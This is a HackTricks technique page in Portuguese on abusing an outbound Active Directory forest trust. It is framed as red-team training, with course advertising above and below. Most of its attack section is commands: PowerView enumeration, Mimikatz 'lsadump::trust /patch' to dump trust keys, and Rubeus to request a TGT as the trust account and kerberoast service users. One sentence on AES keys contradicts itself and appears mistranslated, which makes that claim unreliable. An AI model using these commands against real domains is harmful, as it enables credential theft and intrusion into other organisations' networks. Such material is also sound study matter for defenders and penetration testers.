# Domínio de Floresta Externa - Unidirecional (Saída)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

## Enumeração

### Confiança de Saída
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Ataque à Conta de Confiança

Quando uma confiança de domínio ou floresta do Active Directory é estabelecida de um domínio _B_ para um domínio _A_ (_**B**_ confia em A), uma conta de confiança é criada no domínio **A**, nomeada **B. Chaves de confiança Kerberos**,\_derivadas da **senha da conta de confiança**, são usadas para **criptografar TGTs inter-reinos**, quando usuários do domínio A solicitam tickets de serviço para serviços no domínio B.

É possível obter a senha e o hash da conta confiável de um Controlador de Domínio usando:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
O risco é porque a conta de confiança B$ está habilitada, **o Grupo Primário de B$ é Usuários do Domínio do domínio A**, qualquer permissão concedida aos Usuários do Domínio se aplica a B$, e é possível usar as credenciais de B$ para autenticar contra o domínio A.

{% hint style="warning" %}
Portanto, **do domínio confiante é possível obter um usuário dentro do domínio confiado**. Esse usuário não terá muitas permissões (apenas Usuários do Domínio provavelmente), mas você será capaz de **enumerar o domínio externo**.
{% endhint %}

Neste exemplo, o domínio confiante é `ext.local` e o confiado é `root.local`. Portanto, um usuário chamado `EXT$` é criado dentro de `root.local`.
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
Portanto, neste ponto, temos a **senha em texto claro e a chave secreta Kerberos** atuais de **`root.local\EXT$`**. As chaves secretas Kerberos AES de **`root.local\EXT$`** são idênticas às chaves de confiança AES, pois um sal diferente é usado, mas as **chaves RC4 são as mesmas**. Portanto, podemos **usar a chave de confiança RC4** extraída de ext.local para **autenticar** como `root.local\EXT$` contra `root.local`.
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Com isso, você pode começar a enumerar esse domínio e até mesmo fazer kerberoasting em usuários:
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Coletando a senha de confiança em texto claro

No fluxo anterior, foi utilizado o hash de confiança em vez da **senha em texto claro** (que também foi **extraída pelo mimikatz**).

A senha em texto claro pode ser obtida convertendo a saída \[ CLEAR ] do mimikatz de hexadecimal e removendo os bytes nulos '\x00':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Às vezes, ao criar uma relação de confiança, uma senha deve ser digitada pelo usuário para a confiança. Nesta demonstração, a chave é a senha de confiança original e, portanto, legível por humanos. À medida que a chave é alterada (30 dias), o texto claro não será legível por humanos, mas tecnicamente ainda utilizável.

A senha em texto claro pode ser usada para realizar autenticação regular como a conta de confiança, uma alternativa para solicitar um TGT usando a chave secreta Kerberos da conta de confiança. Aqui, consultando root.local de ext.local para membros de Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Referências

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
